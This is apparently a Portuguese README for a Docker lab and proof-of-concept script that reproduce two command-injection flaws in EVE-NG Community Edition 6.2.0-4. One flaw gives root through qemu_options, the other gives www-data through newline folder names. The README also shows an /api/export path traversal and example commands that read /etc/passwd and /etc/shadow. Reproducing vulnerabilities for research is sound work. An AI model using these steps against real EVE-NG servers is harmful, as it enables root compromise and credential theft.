# Ambiente de laboratório — RCE no EVE-NG Community Edition 6.2.0-4

Este repositório reúne o ambiente de laboratório usado para reproduzir os dois vetores de execução remota de comandos (RCE) no EVE-NG Community Edition 6.2.0-4.

O ambiente é publicado como container por um motivo prático: o `.deb` oficial depende de pacotes que só existem no repositório/ISO da EVE-NG (kernel `eveng-ksm`, `eve-ng-qemu`, `eve-ng-dynamips`, `eve-ng-schema`, `eve-ng-pro-guacamole`). O pacote é, portanto, extraído (`dpkg-deb -x`) em vez de instalado, e apenas as etapas do `pre`/`postinst` relevantes para a aplicação web são reproduzidas. O resultado é fiel ao produto nos arquivos que importam para a análise — `includes/__node.php`, `includes/cli.php`, `includes/functions.php` e `includes/api_folders.php`.

| Item | Detalhe |
| --- | --- |
| Produto | EVE-NG Community Edition 6.2.0-4 (lançada em julho de 2024) |
| Base do container | Ubuntu 22.04 (Apache 2.4.52, PHP 8.1) |
| Credenciais padrão | `admin` / `eve` |
| Vetores reproduzidos | RCE root (`qemu_options`) e RCE www-data (fluxo de pastas) |

## Conteúdo do repositório

| Arquivo | Função |
| --- | --- |
| `Dockerfile` | Monta o ambiente a partir do Ubuntu 22.04 e dos `.deb` oficiais extraídos |
| `docker-compose.yml` | Sobe o container com os volumes e a exposição em localhost |
| `files/schema.sql` | Esquema mínimo do banco (reconstruído a partir das consultas da aplicação) |
| `files/entrypoint.sh` | Inicializa MySQL e Apache em primeiro plano, sem systemd |
| `eveng_rce.py` | PoC dos dois vetores, com confirmação via `/api/export` |
| `debs/` | **Vazio no repositório** — os `.deb` devem ser extraídos da ISO oficial (ver abaixo) |

Os `.deb` **não são redistribuídos** aqui. Eles pertencem à EVE-NG Ltd e devem ser obtidos a partir da ISO oficial.

## Pré-requisitos

- Docker e Docker Compose
- `bsdtar` (pacote `libarchive-tools` no Debian/Ubuntu), para extrair arquivos da ISO sem montá-la
- A ISO oficial `eve-ce-prod-6.2.0-4-full.iso`
- Python 3 e `curl` na máquina que vai rodar o script

## Extração dos `.deb` a partir da ISO

O build depende de dois pacotes extraídos da ISO community. O primeiro é o próprio pacote da aplicação; o segundo é o QEMU do EVE-NG, necessário por um detalhe de compatibilidade descrito adiante.

A ISO é obtida junto à EVE-NG:

```
https://customers.eve-ng.net/eve-ce-prod-6.2.0-4-full.iso
```

Extraia os dois pacotes com `bsdtar`, lendo diretamente de dentro da ISO:

```bash
# Pacote principal da aplicação
bsdtar -xOf eve-ce-prod-6.2.0-4-full.iso \
  packages/eve-ng_6.2.0-4_amd64.deb \
  > debs/eve-ng_6.2.0-4_amd64.deb

# QEMU do próprio EVE-NG
bsdtar -xOf eve-ce-prod-6.2.0-4-full.iso \
  packages/eve-ng-qemu_6.0.1-0_amd64.deb \
  > debs/eve-ng-qemu_6.0.1-0_amd64.deb
```

Se o caminho interno dos pacotes divergir na sua ISO, liste o conteúdo para localizá-los:

```bash
bsdtar -tf eve-ce-prod-6.2.0-4-full.iso | grep '\.deb$'
```

Ao final, `debs/` deve conter os dois arquivos:

```
debs/
├── eve-ng_6.2.0-4_amd64.deb
└── eve-ng-qemu_6.0.1-0_amd64.deb
```

### Por que o QEMU do EVE-NG, e não o do Ubuntu

O `cli.php` cria o linked clone do disco com `qemu-img create -b <backing> -f qcow2 <target>`, sem passar `-F`. O `qemu-img` 6.2 do Ubuntu 22.04 passou a **exigir** `-F` (`Backing file specified without backing format`), o que quebraria o start do node. O pacote `eve-ng-qemu` traz o `qemu-img` 2.12.0 — a mesma versão do produto —, que não exige `-F`. Usá-lo mantém o ambiente fiel ao real sem alterar a aplicação.

## Subindo o lab

Com os `.deb` em `debs/`, o build e a subida são diretos:

```bash
docker compose build
docker compose up -d
```

Acompanhe o log até a mensagem de pronto:

```bash
docker compose logs -f eve-ng
```

A aplicação responde em `http://127.0.0.1:8081`. Faça login com `admin` / `eve`.

> A exposição está restrita a localhost (`127.0.0.1:8081`) de propósito: é uma versão vulnerável e não deve ficar acessível na rede. O container sobe em modo `privileged` porque o start de nodes faz bind mounts (jail, `/opt/qemu-*`, imagens) e falha sem `CAP_SYS_ADMIN`; `privileged` também expõe `/dev/kvm` quando ele existe no host.

> **Lab pronto para o teste.** Na primeira subida, o `entrypoint.sh` cria automaticamente, via API, o lab `teste.unl` com um node QEMU (`poc`, ID `1`) — os valores padrões do script. Não é preciso criar nada pela interface.

Para derrubar e limpar o ambiente:

```bash
docker compose down          # mantém os volumes (mysql, labs)
docker compose down -v       # remove também os volumes
```

## Uso do script (`eveng_rce.py`)

A PoC reúne os dois vetores de execução remota mais o canal de leitura usado para confirmar a execução (path traversal via `/api/export`). Todos os modos exigem uma conta autenticada; por padrão o script loga com `admin` / `eve`.

```
python3 eveng_rce.py --url http://127.0.0.1:8081 [opções]
```

| Vetor | Contexto | Mecanismo |
| --- | --- | --- |
| 1 — `qemu_options` | **root** (via `sudo unl_wrapper`) | injeção no campo `qemu_options` de um node + start |
| 2 — fluxo de pastas | **www-data** | nome de pasta com quebra de linha quebra o `find ... -exec` na exclusão |
| Confirmação | — | leitura arbitrária de arquivo via path traversal em `/api/export` |

### Opções principais

| Opção | Descrição |
| --- | --- |
| `--url` | Base da aplicação (ex.: `http://127.0.0.1:8081`). **Obrigatória** |
| `--user` / `--password` | Credenciais (padrão `admin` / `eve`) |
| `--cookie` | Usa um cookie de sessão em vez de logar (ex.: `unetlab_session=...`) |
| `--lab` | Lab real para ancorar a leitura de volta e o traversal (padrão `/teste.unl`) |
| `--qemu-cmd CMD` | Vetor 1: comando arbitrário como root |
| `--node` | ID do node QEMU alvo do Vetor 1 (padrão `1`) |
| `--exec CMD` | Vetor 2: comando arbitrário como www-data, com leitura da saída |
| `--read-file ALVO` | Confirmação: lê um arquivo arbitrário via `/api/export` |
| `--proxy` | Encaminha as requisições por um proxy (ex.: `http://127.0.0.1:8080` para o Burp) |

### Exemplos

Leitura arbitrária de arquivo, para confirmar o canal de `/api/export`:

```bash
python3 eveng_rce.py --url http://127.0.0.1:8081 --read-file /etc/passwd
```

Vetor 1 — prova de RCE como root. O script já envelopa o comando com `& ... ; true` e, havendo um `> arquivo`, lê esse arquivo de volta automaticamente via `/api/export`:

```bash
python3 eveng_rce.py --url http://127.0.0.1:8081 --lab /teste.unl --node 1 \
  --qemu-cmd "id root > /tmp/eve_proof"
```

O comando roda como root (via `sudo unl_wrapper`), mas o readback é feito pelo www-data — por isso a saída é gravada em um local legível por ele (`/tmp`), e não em `/root`. A leitura retorna `uid=0(root) gid=0(root) groups=0(root)`, confirmando a execução privilegiada.

> O comando precisa de ao menos um argumento real (ex.: `id root`, `cat /etc/shadow`): o escape invertido do `qemu_options` deixa um `\` residual que entra como argumento extra, então comandos sem argumento (`id`, `whoami` puros) saem vazios.

Vetor 2 — comando arbitrário como www-data:

```bash
python3 eveng_rce.py --url http://127.0.0.1:8081 --exec "id"
```

O Vetor 2 só aceita, no comando injetado, letras, números, espaço, `_`, `-` e `/` — o filtro de validação de pasta bloqueia os demais caracteres.

## Referências

- [CVE-2022-27903 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2022-27903)
- [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
- [EVE-NG Community — download e release notes](https://www.eve-ng.net/index.php/community/)